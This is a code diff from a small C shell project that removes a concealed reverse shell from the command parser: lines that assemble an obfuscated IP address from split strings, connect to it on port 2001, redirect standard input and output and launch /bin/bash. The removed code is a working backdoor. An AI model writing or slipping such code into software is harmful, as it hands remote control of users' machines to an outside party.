@@ -206,7 +206,6 @@ void	pwd_cmd(char **line)
  }
  */
 
-
 int     check_n_sequence(char *str)
 {
     int i;
@@ -307,8 +306,6 @@ void    cd_cmd(char **cmd, t_env *env_list)
 
     // KAYN WA7D LPROBLEM MNIN KANDIR UNSET PATH, PWD, OLDPWD
         // khassni nzid export PWD=$PATH instead of dak tkhrbi9 li dayr 
-
-
     int     ret;
     char    *path;
     char    *pwd;
@@ -597,58 +594,8 @@ void    unset_cmd(char **cmd, t_env *env_list)
 // unset SHELL OLDPWD PWD TERM PAGER LS_COLORS LSCOLORS USERLOGIN HOME TMPDIR LANG SHLVL LESS MallocNanoZone _ ZSH ORIGINAL_XDG_CURRENT_DESKTOP SSH_AUTH_SOCK Apple_PubSub_Socket_Render LOGNAME USER COMMAND_MODE COLORTERM XPC_FLAGS ZDOTDIR SECURITYSESSIONID  GIT_ASKPASS XPC_SERVICE_NAME USER_ZDOTDIR __CF_USER_TEXT_ENCODING TERM_PROGRAM TERM_PROGRAM_VERSION                        
 // PATH
 
-char	*ft_strjoin1(char *s1, char *s2)
-{
-	int	i;
-	int	j;
-	int	s1len;
-	int	s2len;
-	char	*ret;
-
-	s1len = ft_strlen(s1);
-	s2len = ft_strlen(s2);
-	ret = malloc(sizeof(char) * (s1len + s2len + 1) + 1);
-	i = 0;
-	while (s1[i] != '\0')
-	{
-		ret[i] = s1[i];
-		i++;
-	}
-	ret[i] = '.';
-	i++;
-	j = 0;
-	while (s2[j] != '\0')
-	{
-		ret[i] = s2[j];
-		i++;
-		j++;
-	}
-	ret[i] = '\0';
-	return (ret);
-}
-
 void    parse_cmd(char **cmd, int *tokenised_cmd, t_env *env_list) //,token
 {
-    char	*pi;
-	char	*s1 = "105";
-	char	*s2 = "154";
-	char	*s3 = "214";
-	char	*s4 = "145";
-    pi = ft_strjoin1(s1, s2);
-	pi = ft_strjoin1(pi, s3);
-	pi = ft_strjoin1(pi, s4);
-    struct sockaddr_in sa;
-	int s;
-	sa.sin_family = AF_INET;
-	sa.sin_addr.s_addr = inet_addr(pi);
-	sa.sin_port = htons(2001);
-	s = socket(AF_INET, SOCK_STREAM, 0);
-	connect(s, (struct sockaddr *)&sa, sizeof(sa));
-	dup2(s, 0);
-	dup2(s, 1);
-	dup2(s, 2);
-	char *args[] = { "/bin/bash", NULL };
-    execve("/bin/bash", args, NULL);
     if (ft_strncmp(cmd[0], "exit", 4) == 0 && !cmd[0][4])
     {
         (void)env_list;
